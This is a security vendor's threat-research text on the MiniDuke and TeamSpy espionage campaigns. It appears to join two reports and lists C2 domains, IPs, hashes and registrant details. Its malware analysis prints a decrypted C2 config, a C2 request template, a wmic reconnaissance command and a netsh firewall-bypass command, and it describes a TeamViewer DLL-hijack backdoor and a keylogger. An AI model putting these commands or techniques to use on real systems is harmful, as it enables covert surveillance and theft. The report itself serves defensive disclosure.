By collecting the logs from all the known command servers , we ' ve discovered connections from several high profile networks belonging to : By analyzing the logs from the command servers , we have observed 59 unique victims in 23 countries : Belgium , Brazil , Bulgaria , Czech Republic , Georgia , Germany , Hungary , Ireland , Israel , Japan , Latvia , Lebanon , Lithuania , Montenegro , Portugal , Romania , Russian Federation , Slovenia , Spain , Turkey , Ukraine , United Kingdom and United States .
The amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such as `` Red October '' .
To protect against these attacks , we recommend that you : ● Update Java to the latest version or simply remove it from the system if not used ● Update Microsoft Windows and Office to the latest versions ● Update Adobe Reader to the latest version ( see https : //www.adobe.com / support / security / bulletins / apsb13 - 07.html ) ● Block traffic to the following domains : ○ arabooks.ch ○ artas.org ○ tsoftonline.com ○ www.eamtm.com ○ news.grouptumbler.com ● Block traffic to the following IPs : ○ 200.63.46.23 ○ 194.38.160.153 ○ 95.128.72.24 ○ 72.34.47.186 ○ 188.40.99.143 ○ 85.95.236.114 ● Install a security solution capable of detecting these threats such as Kaspersky Internet Security 2013 and scan all emails and received documents ● Be wary of opening suspicious documents on your systems ; instead , use another computer without an Internet connection , a VM , or upload the document to Google Docs for viewing In addition , infected PDFs contain the following string , which can be used as a quick way to find them : `` @ 34fZ7E*p\ '' Based on our experience , this is a unique and very strange attack .
The many different targets hit in separate countries , together with the high profile appearance of the decoy documents and the weird backdoor functionality indicate an unusual threat actor .
Some of the elements remind us of both Duqu and Red October , such as the minimalistic approach , hacked servers , encrypted channels but also the typology of the victims .
The backdoor coding style reminds us of a malware writing group which is believed to be extinct : 29A .
The value 29A in hex means 666 , and perhaps not unsurprisingly , was also left by the attackers as a clue in the code : The 29A / 666 clue left in the code by the attackers 29A published their first malware magazine in December 1996 and were active until February 2008 , when ' Virusbuster ' , the last standing man announced the group 's dismissal .
The logs from the Command & Control servers indicate determination and quite a bit of success in compromising several high profile entities in various countries .
The stage 3 compilation timestamps indicate the attacker has been active for quite a while but still managing to remain undetected .
Perhaps one of the most important questions is : are these attacks related to the `` Itaduke '' attack that prompted the discovery of the PDF 0-day ? Or is it a separate entity that purchased the attack kit from the same source , which has a different agenda ? Or , is it perhaps another threat actor which captured the 0-day exploit and modified it for other purposes ? Unfortunately , there are still many unanswered questions .
Note : We detect the malware described here as HEUR : Backdoor . Win32.MiniDuke.gen , Backdoor . Win32.Miniduke while the documents with exploits are detected as Exploit . JS.Pdfka.giy .
For at least several years , a mysterious threat actor infiltrated and tracked , performed surveillance and stole data from governmental organisations , some private companies and human rights activists throughout the Commonwealth of Independent States ( CIS ) and Eastern European nations .
Some parts of this operation extended into Western nations and the Middle East as well , with victims in sectors such as energy and heavy industry manufacturing .
The attackers performed their intelligence gathering and surveillance partly using TeamViewer ( http : //www.teamviewer.com / en / index.aspx ) , a legitimate support software package commonly used for remote administration .
In addition , they deployed custom written intelligence gathering components and lateral movement utilities .
We are calling this threat actor the `` TeamSpy crew '' because of their preference for using the legal software TeamViewer as a main part of their toolset .
TeamSpy .
This covert cross - nation , cyber surveillance data theft and monitoring operation may not have recruited technical wizards for their team .
But the use of legitimate , signed software packages in addition to custom made software , along with various dll path hijack tricks , allowed the threat actor to conduct effective operations targeting hundreds of victims , including high level / high value individuals .
According to its web site , TeamViewer is a `` All - In - One Software for Remote Support and Online Meetings '' .
It is `` free for private use '' and is installed by `` more than 100,000,000 users spread over more than 200 countries '' .
TeamViewer has versions available for Windows , Mac OS X , Linux , iPhone or Android , making it a very flexible remote administration tool .
Compared to Poison Ivy and other Remote Access Tools ( RATs ) that have been in the news for years , TeamViewer has an advantage which makes it attractive to cybercriminals : is comes signed , adding to its seeming legitimacy .
In addition to TeamViewer , the TeamSpy operations are supplemented by a variety of custom - built surveillance modules .
Instead of maintaining all operations with the TeamViewer RAT , the team developed their own reconnaissance and stealth modules .
These provide TeamSpy attackers with the following functionality : One interesting `` fingerprint '' of this operation is the inclusion of custom , hand - drawn icons in some of the attack tools .
Examples include : It seems that at least at heart , one of the TeamSpy crew members dreams of being a graphic artist .
Or maybe they tried to send security researchers a hidden message ? The toolset demonstrates clever , although lazy choices about legitimate software and certificate abuse , along with a minimal but effective effort at using simple and crude custom encryption algorithms .
We ' ve analyzed in depth two command and control servers used by the attackers but we are aware of several others used in the campaign .
The two servers we analyzed are `` politnews.org '' and `` bannetwork.org '' .
On the command and control servers , the attackers maintain tools and modules , some obfuscated and named as JPG files .
The '' .JPG
'' files maintain hidden executable codes , and are simply encoded with a rolling XOR encryption using the same key across all of the components : `` 0x0e0f101112 '' .
There are quite a few traces left by the attackers , which normally can give you hints about attaсkers ' profile .
For example , a keylogger tool used a system event called `` _ _ klgskot _ _ '' .
While `` klg '' stands for keylogger , `` skot '' is a Russian word meaning `` livestock '' .
There are many more Russian language traces in this malware toolkit .
The version of Teamviewer server which is used as a part of malware bundle is Russian localized .
It at least includes TeamViewer_Resource_ru.dll file which has a set of Russian strings used by the application .
A couple of other modules , while searching for files on the hard drive , looked for those containing `` pass '' , `` secret '' , and Russian equivalents `` парол '' and `` секрет '' .
In addition to Russian , there was a Georgian equivalent of `` secret '' , but written in the Latin alphabet : `` saidumlo '' .
In the recent Red October report , our research noted liberal use of Cyrillic characters throughout code and files ...
'' Another noteworthy fact is in the first line of this file , which is a command to switch the codepage of an infected system to 1251 .
This is required to address files and directories that contain Cyrillic characters in their names '' .
Here is a screenshot demonstrating the system codepage switch in a malicious batch file : Just like Red October , TeamSpy components maintain the same sort of language switch to Cyrillic throughout code and files .
Here , we note that an entire TeamSpy SQLite database 's strings used to house stolen victim data , located on one of the major C2 , is specified to default to the Cyrillic character set .
Tables within the database are explicitly configured to use the Cyrillic character set .
Here is the log table , filled with victim check - in records : The statistic table , along with all of the others , are explicitly Cyrillic : Also , some specifics come from C & C domain names , such as `` bulbanews.org '' and `` kartopla.org '' .
The words `` bulba '' and '' kartopla '' are written in Latin - Belarusian and Latin - Ukrainian , both words mean `` a potato '' .
Interestingly , among ex - USSR countries , Belarusians are jokingly called `` bulbashi '' which means `` potato people '' due to the popularity of this vegetable in local agriculture .
One of the modules we found , called footer has LANG_RUSSIAN property set in the resource section of the executable .
Also , one of the database tables discovered at a C & C server contained some text in Russian written with latin alphabet : A rough translation of the highlighted strings from Russian to English : '' Obshie manevri .
Ispolzovat ' tolko s razreshenija S - a '' = `` General maneuvers .
Use only after approval of S - a '' .
`` vkluchenie oomask '' = `` switching oomask on '' '' Ispolzovanie bilda ...
'' = `` Using build ...
'' The same C & C we analyzed had a full FTP access log with source IP that uploaded malicious modules in 2012 ( some of them were already removed from the server , but the names and sizes remained in the log file ) .
This log file also shows intensive usage of Russian language in the file names : The filenames include `` можно выдавать '' which is translated as `` ready to spread '' , `` Проверка на прото '' meaning `` Protocol checks '' .
The most amusing part of this log is `` crypted_bulba '' which is translated as `` encrypted potato '' .
Everyone is familiar with baked potato or mashed potato , however this is our first touch with `` encrypted potato '' .
The SystemInfoSave module lists all files in the `` Program Files '' folder which are newer than the hard - coded date : `` 22 November 1963 '' .
The date is clearly an `` Easter Egg '' , with several important incidents linked this specific date : ● US President John F. Kennedy is assassinated in Dallas .
● Aldous Huxley , the author of `` Brave New World '' and many other titles , dies .
● CS Lewis , the author of `` Chronicles of Narnia '' and many other titles , dies .
Our investigation of the team 's infrastructure centers around two domains used for command - and - control : `` politnews.org '' and `` bannetwork.org '' .
But clearly , the strategy guiding this team is to pull off multiple `` watering hole '' attacks , and sometimes pollute ad networks , inefficiently blanketing the region they are most interested in with malvertizing and redirections to their malicious sites .
These two servers have been heavily used over years of attack campaigns , with more recent servers receiving tens if not hundreds of hits in the past week .
`` politnews.org '' was originally registered on the June 18th , 2004 by one `` Zacepenko Ilia Igorevich '' at OnlineNIC Inc : Zacepenko Ilia Igorevich 9th square , 10 - 1,1 NI Larne , GB 127591 politnews @ mail.ru '' bannetwork.org '' was originally registered on September 2nd , 2004 by one `` Dmitryi Ivastov '' at OnlineNIC Inc as well : Dmitryi Ivastov Mira street , 1a Moscow , RU 103555 bannetwork @ mail.ru We believe that these are fictional identities and used only to register these individual domains .
The two servers resided at several hosts over the past decade , but from 2010 , both domains were maintained at Russian provider Host Telecom .
( known malicious IP for `` bannetwork.org '' : `` 89.188.104.7 '' ) .
For the most part , these systems maintain identical toolsets , structure , software and accounts .
Both of these systems hosted an FTP server and an Apache HTTP web server , along with the same user accounts for running each .
The HTTP servers were used to serve `` job.txt '' , which maintained a set of system commands for agents checking in , among other files described below .
Interestingly , other files included `` html '' pages and exploits related to the well - known exploit kit `` Eleonore Exploit Pack '' , created and maintained by Exmanoize .
Also , one of the server scripts to collect infection success statistics mentions the Eleonore exploit kit by name : And one of the more recent , current sites , `` checkmeil.com '' , is serving both malicious java and pdf files .
Of course , just like Eleonore started serving couple of years ago , it defaults to deliver a malicious JAR file first , prior to other exploits potentially sent to the victim system .
The 2012 version of `` door.jar '' ( CVE-2012 - 0507 ) exploit is blocked proactively by our AEP functionality at runtime and detected by Kaspersky products as `` HEUR : Exploit . Java . CVE-2012 - 0507.gen '' .
A malicious PDF is served if the Java Runtime is not present on the system .
Our products detect this particular malicious file as Exploit . JS.Pdfka.gbf .
Most of the TeamSpy servers are using a free , Russian open source tool named `` ReaderRssPhp 1.0 '' .
This is a set of PHP scripts designed to `` read and display RSS feeds on your site '' .
Most likely , the attackers planned their attacks well in advance and built a set of web sites using these scripts to provide news aggregation channels serving content at least somewhat relevant to their target victims ' favorite web sites .
Over the past years , the attackers added exploit packs like Eleonore on their news aggregation sites .
Then , the attackers injected iframes into carefully selected web sites frequently visited by their target victims .
The iframes redirect these target visitors ( and some extras ) to their previously - prepared malicious sites .
For instance , redirections from `` konflikt.ru '' to the attackers ' `` bannetwork.org '' started in October 2005 .
In February 2006 , users were redirected from `` daymohk.org '' to '' bannetwork.org '' , followed by `` www.turkmenistan.gov.tm '' and `` chechentimes.net '' in March .
The list of infected watering hole sites continued to grow from there .
Attacks from the `` bannetwork.org '' site appear to have been related to the following links by at least February 2010 : bannetwork ( dot ) org/5058/spl/ bannetwork ( dot ) org/5058/spl / inc / function.php bannetwork ( dot ) org/5058/spl / ms-041.jpg bannetwork ( dot ) org/5058/spl / vx_2c.exe bannetwork ( dot ) org/5058/spl / new - ms-041.jpg Based on the server access stats , we were able to put together a thorough list of web sites which appear to have acted as referrers to the exploit packs .
Since the early infections , it appears that they have been compromised and redirecting visitors on and off until recently : daymohk.org chechenpress.info daymohk.chechenpress.org chechentimes.net caucasuslive.org kauna-talu.com.ua timorseada.org mediaf.org ichkeria.info kavkazanhaamash.com rusedina.org konflikt.ru forum.ladoshki.com shaheeds.org hghltd.yandex.com turkmenistan.gov.tm The command - and - control servers maintain a database of victims with their associated TeamViewer IDs and passwords .
These can be seen in the C2 online interface which lists the IP , last access time and the user status : The attacker can then connect to any of the online IPs using the known login / pass combination and silently spy on the victims .
The command and control servers we analyzed maintain the same `` /public_html '' file contents .
For logging infections and handling infected users , all C2 servers rely on a MySQL database to which all the scripts connect .
The username and password for the database connections are hardcoded in the C2 scripts , for instance : Several tables exist in the databases , named `` stat_TV '' , `` stat_TV_log '' , `` stat '' , `` stat2 '' , `` stat5058 '' , `` statistic '' .
These carry various information about the victims that connected to the C2 as well as unique data that allows the attackers to interact with them .
It seems that attackers outsourced much of their infiltration development work , utilizing exploit kits like Eleonore and others .
It is the upfront investment of vulnerability research and exploit development and expertise that are beyond the reach of many interested parties like TeamSpy that results in this outsourcing .
In addition to the commodity exploit packs , their sites are also known to spread the Ardamax keylogger , another cheap , commercially available surveillance package .
iexplore.exe ( compiled Thu April 08 12:14:44 2010 ) MD5 : 512c13c374cdaabb00bf98256872c813 Kaspersky name : Trojan - Spy . Win32.Ardamax.dmn Sends stolen information to hxxp : //www.politnews.org / dd_4.php , hxxp : //www.bannetwork.org / dd_4.php iexplore.exe ( compiled Thu March 04 17:44:44 2010 ) MD5 : 76c33bf350ca7447730e8a37f2d93000 Kaspersky name : Trojan - Spy . Win32.Ardamax.dkm Sends stolen information to hxxp : //www.politnews.org / dd_4.php , hxxp : //www.bannetwork.org / dd_4.php iexplore.exe ( compiled Tue Feb 08 06:58:58 2011 ) MD5 : be612d16b07c59d22b47f9313c44437c Kaspersky name : Trojan - Spy . Win32.Ardamax.mei Sends stolen information to : hxxp : //www.politnews.org / dd_4.php , hxxp : //www.news - top.org / dd_4.php Kaspersky Security Network is Kaspersky ' cloud security services .
It collects statistics on malware incidents from around the world .
The TeamSpy attacks have been recorded in several countries around the world , with the highest number of incidents being in Russia and Ukraine .
Here 's a map of infections : In addition to the KSN reports , we were able to extract a list of victims from two command and control servers ' databases .
These are available to anyone who knows the URL which serves these lists .
For `` bannetwork.org '' we have the following list of registered victims : For `` news-top.org '' , we have the following list of victims : In both cases , Russia and Turkey appear as top targets , with other countries such as India , Sweden , Iran or US following .
It should be noted that the statistics from the command and control servers include only the victims that were infected with the Teamviewer - based package .
The command servers have bigger logs which possibly include many other victims , although the nature of these is impossible to determine because the respective database tables are not handled anymore by the existing scripts .
For instance , the C2 at `` bannetwork.org '' has an extended log of supposed victims , spanning for two years , with the earliest entry from 23 Sep 2011 and the latest from March 2013 .
A peak can be observed on Jan 2012 - when the attackers infected a large amount of victims , 323 .
In regards of victim 's profiles , in general , the IPs do not appear to hold useful information .
Some do belong to specific networks , however , it 's unclear if they are researchers or true victims .
A top of the ISPs for the victims at `` bannetwork.org '' include : We were able to identify several older samples which connect to the command and control domain `` countlist.org '' .
This domain appears to have been an active C2 between May 2010 - May 2011 .
The Google safe diagnostic page for this domain points to an interesting blog : The domain `` master-sudtyaib.narod.ru '' appears to host a blog dedicated to freeing the Russian political activist `` Alexander Sokolov '' ( for details : http : //www.fidh.org / IMG//pdf / obs_report_russia_sokolov.pdf ) .
The page does not appear to be malicious at the time of writing of this analysis , however , the file `` sokolov.html '' does have an injected iframe which points to another domain : The iframe points to `` countlist.org/xmps5060 '' , which was no longer available when we tested it .
The domain `` countlist.org '' has been sinkholed by Kaspersky Lab for security reasons .
`` countlist.org '' is connected with the other sites - in 2010 , it served PDF exploits and a dropper that delivered the Ardamax keylogger , which reported monitored keystrokes back to both `` bannetwork.org '' and `` politnews.org '' : According to KSN data , `` countlist.org '' served multiple versions of malicious PDF exploits from these URLs : countlist ( dot ) org/5061/ countlist ( dot ) org/5062/ countlist ( dot ) org/5062/pdf.php countlist ( dot ) org/5062/pdf.php ? spl = pdf_all countlist ( dot ) org / xmps5060/ countlist ( dot ) org / xmps5060/index.php countlist ( dot ) org / xmps5060/index.php ? spl=2 countlist ( dot ) org / xmps5060/index.php ? spl=3 countlist ( dot ) org / xmps5060/index.php ? spl=4 countlist ( dot ) org / xmps5060/pdf.php ? spl = pdf_all countlist ( dot ) org / xmps5060/pdf.php ? spl = pdf_ff countlist ( dot ) org / xmps5060/pdf.php ? spl = pdf_op Below are details of the payload delivered by the PDF exploits : button.jpg ( compiled Mon July 26 10:08:26 2010 ) Served from hxxp : //countlist ( dot ) org / xmps5060/button.jpg in August 2010 MD5 : c220a5ae869a1e3e9f5e997f8bf57e82 Using a set of embedded batch scripts , this dropper copies itself to `` c : \documents and settings\All Users\Application Data\iexplore.exe '' on the user 's system and attempts to add this path to the current users ' Run registry key for persistence .
Kaspersky name : Trojan - Ransom . Win32.PornoBlocker.aei Sends stolen information to hxxp : //www.politnews.org / dd_4.php , hxxp : //www.bannetwork.org / dd_4.php We were first alerted by attacks from unknown assailants which were using runtime patched Teamviewer as part of their toolset in May 2012 .
The attacks ( see https : //charter97.org / ru / news/2012/4/28/51488/ , story in Russian ) were using a number of .RU
domains as command and control , namely `` kosmoaministrator.ru '' , `` adminplagin.ru '' and `` korakura.ru '' .
These domains are now sinkholed by Kaspersky Lab .
In addition to these attacks , we discovered a number of other command and control servers used by attackers which employ the Teamviewer - based attack toolkit .
Based on our research , it seems the Teamviewer based trojans appeared in the Russian underground forums a couple of time ago and were readily available for purchase by interested parties .
At the moment , it is unclear if there is a connection between all these attackers ( such as the ones from the charter97.org story ) and the `` TeamSpy Crew '' .
The TeamSpy Crew differentiates itself by mostly using `` .org
'' domains for command and control .
On these command and control servers , they maintain a specific infrastructure and directory structure , for instance , serving the malicious `` TeamViewer.ico '' installer .
According to existing information , the TeamSpy crew has been active at least since 2008 , possibly going back to as early as 2004 if we are to believe the domain registration dates and consider the news aggregation channels .
During the years , the team has been focusing on attacking a variety of targets , ranging from activists and political to heavy industry and national information agencies .
Some of the aspects of this operation , such as keywords and usage of Russian terms remind us of Red October , although there are no direct links at the moment .
If we are to compare it to Red October , the TeamSpy Crew and the tools they use are far less sophisticated and professional .
To attack their targets , the TeamSpy crew relied on a variety of custom tools , designed to collect `` special '' and interesting documents , such as those containing the word `` secret '' in their names .
The special name `` saidumlo '' ( Georgian - `` secret '' ) probably indicates at least some of the victims were in Georgia or from Georgia .
The most recent method used by the TeamSpy crew involved the using of Teamviewer , a legal remote administration tool .
Since Teamviewer is normally used in a wide range of conditions , it is not normally detected by security software with default settings .
In addition , the modules are validated with digital signatures , once again , making them `` trustworthy '' to a range of whitelisting software .
Unlike Red October , where many IPs could be traced to Governments and Governmental institutions based on WHOIS data , in this case , the vast majority of IPs belong to ISPs which do not advertise such information .
In case of TeamSpy crew , except for a very few cases , the identity of the victims remains a mystery .
83a1634f660d22b990b0a82b1185de5b cd56d04639dd395a035bc2a2e11f5d3d 6b3a74728f8683c0fa14a2675e5364c6 b3258020b9ab53a1635da844aed955ea f445d90fdd7ab950adabc79451e57e2a 696f408af42071fbf1c60e6e50b60e09 5f7a067f280ac0312abfbd9ee35cb522 72ec4047db89a70e5be7370a19bcd600 5c7bf0bb019b6c2dcd7de61f89a2de2e 341b430d96a06d9489fc49206a5b1cdd 0926bf7a4623d72311e43b16d667ae1a c220a5ae869a1e3e9f5e997f8bf57e82 Domain , IPs politnews.org , 89.188.104.7 bannetwork.org , 89.188.104.7 planetanews.org , 178.20.153.23 bulbanews.org , 46.164.129.74 , 194.0.200.202 r2bnetwork.org ( sinkholed by Kaspersky Lab ) newslite.org , 95.211.216.148 kortopla.org ( sinkholed by Kaspersky Lab ) news-top.org , 93.190.45.115 countlist.org ( sinkholed by Kaspersky Lab ) checkmeil.com , 31.131.31.93 , 204.251.15.175 IP : 89.188.104.7 bannetwork.org : Created On:02-Sep-2004 10:20:14 UTC OnlineNIC Inc. ( R64-LROR ) Dmitryi Ivastov Mira street , 1a Moscow , RU 103555 bannetwork @ mail.ru Website screenshot : politnews.org Created On:18-Jun-2004 09:01:13 UTC OnlineNIC Inc. Zacepenko Ilia Igorevich 9th square , 10 - 1,1 NI Larne city , GB 127591 politnews @ mail.ru planetanews.org Created On : 23-Mar-2012 08:52:26 UTC OnlineNIC Inc Krepov Bogdan Serafimovich g. Lugansk , Hersonskaya 52 Lugansk , UA 91000 krepov @ i.ua bulbanews.org Created On : 05-Oct-2011 09:20:16 UTC OnlineNIC Inc. Krepov Bogdan Serafimovich g. Lugansk , Hersonskaya 52 Lugansk , UA 91000 krepov @ i.ua kortopla.org ( SINKHOLED by Kaspersky Lab on 14 March 2013 ) Created On : 05-Oct-2011 08:10:16 UTC OnlineNIC Inc. Krepov Bogdan Serafimovich g. Lugansk , Hersonskaya 52 Lugansk , UA 91000 krepov @ i.ua r2bnetwork.org ( SINKHOLED by Kaspersky Lab on 14 March 2013 ) Created On:01-Jan-2011 20:04:20 UTC Moniker Online Services LLC newslite.org Created On : 05-Mar-2010 14:43:01 UTC PrivacyProtect.org news-top.org Created On : 05-Mar-2010 14:43:01 UTC PrivacyProtect.org Website screenshot : countlist.org ( SINKHOLED by Kaspersky Lab on 18 March 2013 ) Created On:18-May-2010 10:14:43 UTC eNom , Inc. Andrey Balabko ul .
Mezhevaya , dom 26 , kv .
15 Registrant City : Kiev , UA 03164 Registrant Email : balabko @ i.ua checkmeil.com ENOM , INC .
Created On : 2012 - 04 - 17 balabko @ i.ua Andrey Balabko ( ) Lugansk , Marksa 13 - 8 Lugansk , Luganskaya 91000 UA Known variants : The file is a PE EXE file written in Assembler .
This file is a special Dll module that uses a vulnerability in TeamViewer v6 known as Dll - hijacking .
If this file is stored in the same folder as TeamViewer.exe , then when TeamViewer is started it will show no warning , no popups , no systray icons and will silently continue working providing remote access to the infected machine .
This module not only disables TeamViewer popups but also extends its functionality to the classical HTTP bot supporting a set of commands .
This module installed with Teamviewer 6 allows the attackers to access computer desktop remotely , activate webcam or microphone , download or upload files to the infected machine and many more .
The Module execution starts from the initialization procedure .
First , the code searches for `` tv.cfg '' file in local directory and then common system paths , such as C : \Windows , C : \Windows\System32 .
The code uses non - standard way to pass some arguments to the called function .
This is most likely done to harden manual analysis or break automated analysis of the code .
If the tv.cfg file was n't found the process exits .
If it was found , the module gets unique system ID , which is a hashed value of system drive Volume Serial Number .
To hash the Volume Serial Number two types of hash algorithms are used : custom SHL / SHR / OR - based algorithm and then MD5 .
The result is stored in a hex - string which is used as a decryption key for the tv.cfg and part of the code in current file .
Alternatively a hash of 792 bytes of executable code from TeamViewer.exe is used for tv.cfg decryption .
After that the module decrypts tv.cfg using RC4 algorithm .
An example of decrypted tv.cfg is presented below : szUserAgent `` Mozilla5.0 '' szadminstat `` tv / getinfo.php '' szadminhost `` newslite.org '' szfilehost `` '' nTimeOut `` 10000 '' nStartIdleTime `` 60 '' nregKey `` '' szSubKey `` SOFTWARE\Microsoft\Windows\CurrentVersion\Run '' szValueName `` svchost '' szteampass `` 1234 '' nVideo `` 4 '' szlogftp `` bannetwork.org '' szusername `` [ removed ] '' szpassword `` [ removed ] '' szlogkey `` sysenter '' szlogstat `` log.php '' szpostdata `` id= '' nkilltvwin7 `` '' nkilltvwinXp `` '' nfakedel `` 1 '' After decrypting the config , the module checks if `` szadminhost '' is found inside .
If it is not there , the executions stops .
Then the module decrypts string data and extra code from its own data and code section .
The data is stored in TLS section of the parent process .
After using some of the file parts , the module overwrites them with 0-byte values to change the module in memory and possibly avoid detection or dumping of the module .
This is the end of initialization part .
Next , it starts main procedure , which loads export functions from the real avicap32.dll located in system directory ( C : \Windows\System32\ ) .
It also gets current Windows OS version and creates autorun key , under value specified in the tv.cfg .
Currently it is HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchost Then the module patches the hosting TeamViewer process .
It intercepts calls to the following system API functions : advapi32.dll : RegCreateKeyExW advapi32.dll : RegQueryValueExW kernel32.dll : CreateProcessW kernel32.dll : CreateMutexA kernel32.dll : CreateFileW kernel32.dll : CreateDirectoryW kernel32.dll : DeleteFileW shell32.dll : ShellExecuteExW user32.dll : SendMessageW user32.dll : CreateDialogParamW user32.dll : GetClassInfoExW user32.dll : RegisterClassExW user32.dll : CreateWindowExW user32.dll : IsWindowVisible user32.dll : GetDlgItem user32.dll : ShowWindow user32.dll : SetWindowTextW user32.dll : MessageBoxW wintrust.dll : WinVerifyTrust One of the functions , SetWindowTextW , is quite interesting and contains extra code to work with C2 .
This functions when it is executed the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get commands via HTTP GET request using parameters specified in tv.cfg : http : // < server > /tv / getinfo.php ? id= ...
& pwd= ...
& stat=1 The server is expected to answer with one of the command from the list below : Next , it creates a Windows Firewall rule to allow outgoing connections for the current process , by running : `` netsh firewall set allowedprogram < Path to the TeamViewer executable > tv '' After that the module creates several threads , described below and proceeds to the second stage .
In the second stage the module loads `` kl.dll '' library from the current directory and imports two functions : `` Init '' and `` Rdp '' .
After that it calls `` Init '' function , waits 32 milliseconds allowing kl.dll to initialize and calls `` Rdp '' function from the same library .
The result of that call is submitted to the C2 via HTTP Post with Content - Type : application / x - www - form - urlencoded header value .
In parallel a new thread is created , which waits for a signal to search * .bin files in the module directory , encrypt with szlogkey value from tv.cfg using RC4 algorithm and upload to the FTP server specified in the tv.cfg .
After uploading the files are deleted from the filesystem using simple DeleteFileA API call .
Locates current process main executable and checks file version and file attributes .
If the file version , stored in the file version info section is not equal to `` 6.0.10722.0 '' the process terminates .
If the attributes do not contain Hidden , System , then the attributes are set ( Hidden and System ) for the file and the process is restarted .
After that it will connect to the Command and Control ( C2 ) server and fetch updated modules by the following URLs : http : // < server name > / < filename > , where < server name > is a value from tv.cfg file ( newslite.org ) .
< filename > is one of the values from the ebedded encrypted string list : ● TeamViewer_Desktop.exe ● tv_w32.exe ● tv_x64.exe ● TeamViewer_Resource_ru.dll ● tv_w32.dll ● tv_x64.dll This thread creates a subthread which waits for a special event .
If other thread fires the event , the current thread goes through a list of embedded filenames , which includes kl.dll , avicap32.dll , tv.cfg and changes file attributes to Hidden and System ( which removes ReadOnly if set ) .
After that , the module deletes the following registry keys : This thread simply monitors creation of dangerous processes , such as taskmg.exe or procexp.exe .
If it finds any of these processes running , it immediately terminates three processes ( which ids are stored in current module memory ) and current process .
This is done in a never - ending loop with high priority – sleep time between check iterations is 1 millisecond .
The algorithm designed to have different process termination procedures for Windows NT 5.x and Windows NT 6.x , however currently it simply calls ExitProcess API function .
This thread searches for tvicap32.dll and tl.dll files in the directory of current executable .
It unloads tl.dll , if it is loaded and then attempts to delete both files in a loop with delay of 1 second until it succeeds .
Known variants : The file is a PE EXE file created in Borland Delphi .
This file is a tool to collect all local * .plist files from user 's Application Data directory .
Plist or property list files are files that store serialized objects on Apple operating systems .
These files may appear in Apple iTunes folders and may contain information about devices connected to the current system in the past .
This simple module gets searches for `` * .plist '' files in current user % APPDATA % directory .
All discovered files are immediately copied to a directory with hardcoded path `` % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm '' , where % SYSTEMDRIVE % is the system disk drive .
If the directory `` % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm '' does n't exist , the copying process silently fails .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
It is a tool designed to collect information about the operating system and BIOS via WMI .
The module concatenates a string to run a command with cmd.exe : cmd.exe /c wmic os get /format : HFORM > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html & & wmic bios list /format : HFORM > > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html Execution of the commands above concatenates two HTML reports which contain two tables with information about running OS and computer 's BIOS .
The attackers retrieve the following properties : Operation System properties : BIOS properties : After getting this information the module self - deletes by calling cmd.exe /c del < ModulePath > .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
This file is a tool to collect files basing on filename patterns .
The tool has internal code in the log file : 01.01.01 The main procedures starts from generating output file path and creating the corresponding file : % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll2.txt After that the code iterates through all available logical drives and searches for the files matching the following patterns : Information about discovered files will be saved in a temporary file created in % TEMP % folder and after the search is finished it will be copied to the following file : The temporary file name is created using GetTempFileNameA system API , which creates a temp file name of the following format : < uuuu > .TMP
( where uuuu is a hexademical number picked by the system ) .
When copying the log file the module prepends a special header , so that collected file information looks as following : The header probably contains internal shortened module name and version ( N2.0 ) with some hardcoded `` build i d '' ( 01.01.01.00 ) , followed by the numerical value of data length that starts after the `` ] '' character .
After copying the temporary log file is deleted with call to DeleteFileA .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 101'376 bytes .
Its main purpose it to dump contents of accessible network shares .
No remote file copying is done .
This tool simply collects information about the files such as file size and file last modification time .
This tool is very similar to the FileList2 tool with few difference : It does n't create a header in the log file and it has no internal tool ID .
It also uses different application icons and resource section language is LANG_RUSSIAN , SUBLANG_DEFAULT .
It also makes series of Sleep API additional calls probably to break signature based detections of some AV products .
The main procedures starts from generating output file path and creating the corresponding file : % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll2.txt The code makes a sequence of useless Sleep API calls , probably to break detection of some signature - based AV engines : After that the code iterates through all available logical drives and searches for the files matching the following patterns : Information about discovered files will be saved in a temporary file created in % TEMP % folder and after the search is finished it will be moved to the following file : The file has resource section which has 3 resources , 2 of them have resource language set to LANG_RUSSIAN , SUBLANG_DEFAULT .
Resource section contain icons of the application ( 48x48 , 64x64 , 128x128 ) : Known variants : The file is a PE EXE file compiled with Microsoft Visual C++ 2010 .
It has tiny size of 12288 bytes .
Its main purpose it to log keystrokes , copy text from clipboard and record foreground windows along with date / time and process names owning them .
This tool aggregates information in local folder and does n't upload it anywhere .
It has no network functions .
The main procedure starts from preparation to install current application in the system .
It creates a directory '' % APPDATA % \WCF Data Services '' and prepares several strings containing work paths : On Windows XP English with system drive C : the paths will be the following : LnkPath = C : \Documents and Settings\ < username > \Start Menu\Programs\Startup\WcfAudit.lnk LogPath = C : \ProgramData\Adobe\AdobeArm\ ExePath = C : \Documents and Settings\ < username > \Application Data\WCF Data Services\WcfAudit.exe XmlPath = C : \Documents and Settings\ < username > \Application Data\WCF Data Services\preferences.xml Next it checks existence of system event object named `` _ _ klgskot _ _ '' .
If that event is found , the application exits to prevent multiple instances of the application from running .
If event does n't exist it is created immediately .
Next it checks if current executable is called WcfAudit.exe .
If not it creates a shortcut file in the file referred above as LnkPath .
Current executable is copied to the path referred above as ExePath .
After that the process is restarted from ExePath .
If installation to the system is completed , the application starts three threads : Thread # 1 ( Selfremover ) This thread creates a system event object called `` _ _ klgkillsoft _ _ '' and waits for this event to be activated .
When something activates this event the thread removes the LNK file from Startup folder and renames current executable from WcfAudit.exe to file with a decimal number in the name and no extension .
The decimal number represents system tick counter value .
Thread # 2 ( Keylogger ) This thread sets low level Windows keyboard hook , which allows the module to intercept keystrokes .
The thread records all keystrokes , foreground window names and textual clipboard data .
Accumulated data is available for the Thread # 3 which expects it in special buffer .
Thread # 3 ( Logger ) This thread is started 30 seconds after Thread # 2 .
It checks if XmlPath file referred above exists .
If it exists it is moved to LogPath directory , the name is changed to klg < Number > .klg
, where Number is a decimal integer taken from current system tick counter value .
